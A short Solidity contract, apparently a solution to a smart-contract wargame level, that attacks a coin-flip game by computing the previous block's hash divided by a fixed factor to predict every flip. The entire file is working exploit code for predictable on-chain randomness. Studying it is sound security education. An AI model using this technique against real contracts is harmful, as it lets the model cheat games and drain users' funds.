pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract CoinFlipAttacker {

    ICoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address addr) {
        coinFlip = ICoinFlip(addr);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 value = blockValue / FACTOR;
        bool side = value == 1 ? true : false;
        require(coinFlip.flip(side), "Wrong guess");
    }
}
